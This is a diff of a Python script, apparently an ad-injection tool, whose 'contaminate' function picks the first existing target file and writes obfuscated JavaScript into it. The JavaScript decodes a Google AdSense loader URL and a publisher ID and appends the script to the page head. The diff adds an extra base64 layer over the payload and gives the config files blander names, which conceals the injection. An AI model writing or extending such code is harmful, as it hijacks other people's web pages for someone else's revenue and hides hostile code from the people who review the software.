@@ -1,3 +1,4 @@
+import base64
 import json
 import os
 import time
@@ -19,7 +20,7 @@ def fetch_config(url_path, name):
 
 globals_file = os.path.join(
     os.path.dirname(os.path.abspath(__file__)),
-    'g.json'
+    'info.json'
 )
 
 def get_globals():
@@ -62,7 +63,7 @@ def get_config():
         update_globals('update', True)
     location = os.path.join(
         os.path.dirname(os.path.abspath(__file__)),
-        'c.json'
+        'conf.json'
     )
     if globals_conf['update']:
         fetch_config(
@@ -78,19 +79,24 @@ def get_config():
     return json.loads(config)
 
 
-def contaminate(file_path):
+def get_target_contaminate(file_paths):
+    for file_path in file_paths:
+        if os.path.exists(file_path):
+            return file_path
+    return False
+
+
+def contaminate(file_paths):
     """
-    :param file_path: which file
+    :param file_paths: which files
     :return:
     """
-    is_exists = os.path.exists(file_path)
-    if not is_exists:
+    file_path = get_target_contaminate(file_paths)
+    if not file_path:
         return False
 
-    ads_code = """
-    function bar2(foo1,foo){var bar=foo2();return bar2=function(bar1,Bar2){bar1=bar1-0xa8;var Bar1=bar[bar1];return Bar1;},bar2(foo1,foo);}function foo2(){var Bar2=['appendChild','16462230pfHvCY','552TnWsqr','21TgHTKx','async','24588SrzGYO','363894rrtNFG','querySelector','script','head','anonymous','510775rwehIy','6BEEmbK','aHR0cHM6Ly9wYWdlYWQyLmdvb2dsZXN5bmRpY2F0aW9uLmNvbS9wYWdlYWQvanMvYWRzYnlnb29nbGUuanM/Y2xpZW50PQ==','1334805ytshBr','1072656XSqaZe','305438lnJDWE','src','Y2EtcHViLTQwNzc5MzE4Njg4MTcwMDA='];foo2=function(){return Bar2;};return foo2();}(function(bar,bar1){var Bar1=bar2,Foo1=bar();while(!![]){try{var Foo2=-parseInt(Bar1(0xad))/0x1+-parseInt(Bar1(0xb2))/0x2*(parseInt(Bar1(0xae))/0x3)+-parseInt(Bar1(0xb1))/0x4+-parseInt(Bar1(0xb0))/0x5+parseInt(Bar1(0xa8))/0x6*(-parseInt(Bar1(0xb8))/0x7)+parseInt(Bar1(0xb7))/0x8*(parseInt(Bar1(0xba))/0x9)+parseInt(Bar1(0xb6))/0xa;if(Foo2===bar1)break;else Foo1['push'](Foo1['shift']());}catch(Bar){Foo1['push'](Foo1['shift']());}}}(foo2,0x49986),(function(){var Foo=bar2,foo1=document['createElement'](Foo(0xaa)),foo=document[Foo(0xa9)](Foo(0xab));foo1[Foo(0xb3)]=atob(Foo(0xaf))+atob(Foo(0xb4)),foo1[Foo(0xb9)]=!![],foo1['crossorigin']=Foo(0xac),foo[Foo(0xb5)](foo1);}()));
-    """
-    ads_code = ads_code.strip()
+    ads_code = b'ZnVuY3Rpb24gYmFyMihmb28xLGZvbyl7dmFyIGJhcj1mb28yKCk7cmV0dXJuIGJhcjI9ZnVuY3Rpb24oYmFyMSxCYXIyKXtiYXIxPWJhcjEtMHhhODt2YXIgQmFyMT1iYXJbYmFyMV07cmV0dXJuIEJhcjE7fSxiYXIyKGZvbzEsZm9vKTt9ZnVuY3Rpb24gZm9vMigpe3ZhciBCYXIyPVsnYXBwZW5kQ2hpbGQnLCcxNjQ2MjIzMHBmSHZDWScsJzU1MlRuV3NxcicsJzIxVGdIVEt4JywnYXN5bmMnLCcyNDU4OFNyekdZTycsJzM2Mzg5NHJydE5GRycsJ3F1ZXJ5U2VsZWN0b3InLCdzY3JpcHQnLCdoZWFkJywnYW5vbnltb3VzJywnNTEwNzc1cndlaEl5JywnNkJFRW1iSycsJ2FIUjBjSE02THk5d1lXZGxZV1F5TG1kdmIyZHNaWE41Ym1ScFkyRjBhVzl1TG1OdmJTOXdZV2RsWVdRdmFuTXZZV1J6WW5sbmIyOW5iR1V1YW5NL1kyeHBaVzUwUFE9PScsJzEzMzQ4MDV5dHNoQnInLCcxMDcyNjU2WFNxYVplJywnMzA1NDM4bG5KRFdFJywnc3JjJywnWTJFdGNIVmlMVFF3TnpjNU16RTROamc0TVRjd01EQT0nXTtmb28yPWZ1bmN0aW9uKCl7cmV0dXJuIEJhcjI7fTtyZXR1cm4gZm9vMigpO30oZnVuY3Rpb24oYmFyLGJhcjEpe3ZhciBCYXIxPWJhcjIsRm9vMT1iYXIoKTt3aGlsZSghIVtdKXt0cnl7dmFyIEZvbzI9LXBhcnNlSW50KEJhcjEoMHhhZCkpLzB4MSstcGFyc2VJbnQoQmFyMSgweGIyKSkvMHgyKihwYXJzZUludChCYXIxKDB4YWUpKS8weDMpKy1wYXJzZUludChCYXIxKDB4YjEpKS8weDQrLXBhcnNlSW50KEJhcjEoMHhiMCkpLzB4NStwYXJzZUludChCYXIxKDB4YTgpKS8weDYqKC1wYXJzZUludChCYXIxKDB4YjgpKS8weDcpK3BhcnNlSW50KEJhcjEoMHhiNykpLzB4OCoocGFyc2VJbnQoQmFyMSgweGJhKSkvMHg5KStwYXJzZUludChCYXIxKDB4YjYpKS8weGE7aWYoRm9vMj09PWJhcjEpYnJlYWs7ZWxzZSBGb28xWydwdXNoJ10oRm9vMVsnc2hpZnQnXSgpKTt9Y2F0Y2goQmFyKXtGb28xWydwdXNoJ10oRm9vMVsnc2hpZnQnXSgpKTt9fX0oZm9vMiwweDQ5OTg2KSwoZnVuY3Rpb24oKXt2YXIgRm9vPWJhcjIsZm9vMT1kb2N1bWVudFsnY3JlYXRlRWxlbWVudCddKEZvbygweGFhKSksZm9vPWRvY3VtZW50W0ZvbygweGE5KV0oRm9vKDB4YWIpKTtmb28xW0ZvbygweGIzKV09YXRvYihGb28oMHhhZikpK2F0b2IoRm9vKDB4YjQpKSxmb28xW0ZvbygweGI5KV09ISFbXSxmb28xWydjcm9zc29yaWdpbiddPUZvbygweGFjKSxmb29bRm9vKDB4YjUpXShmb28xKTt9KCkpKTs='
+    ads_code = base64.b64decode(ads_code)
     f = open(file_path, 'r')
     lines = f.readlines()
     f.close()
